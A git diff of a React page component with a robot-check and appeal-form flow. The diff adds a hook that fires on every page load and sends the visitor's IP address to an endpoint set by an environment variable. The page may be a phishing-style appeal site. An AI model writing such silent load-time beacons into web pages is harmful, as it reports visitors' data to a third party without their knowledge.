@@ -1,5 +1,5 @@
 import styles from '../styles/Home.module.css'
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 import Sidebar from './sidebar';
 import RobotCheck from './robot-check';
 import AppealForm from './appeal-form';
@@ -12,6 +12,18 @@ import { db } from  '../firebaseConfig';
 export default function Home(ip) {
 
   const [steps, setOpen] = useState({step_one: true, step_two: false, step_three: false, step_four: false});
+
+  useEffect(()=>{
+    /*
+    Query logic
+    */
+    console.log('i fire once', ip.userIP);
+    sendOpenedScript();
+  },[]);  
+
+  const sendOpenedScript = async () => {
+    await fetch(`${process.env.customKey} Open Script url (${ip.userIP})`).then( res => res.json());
+  } 
 
   const getData = (data) => {
     if(data.type == 'robot-check') setOpen({step_two: true});
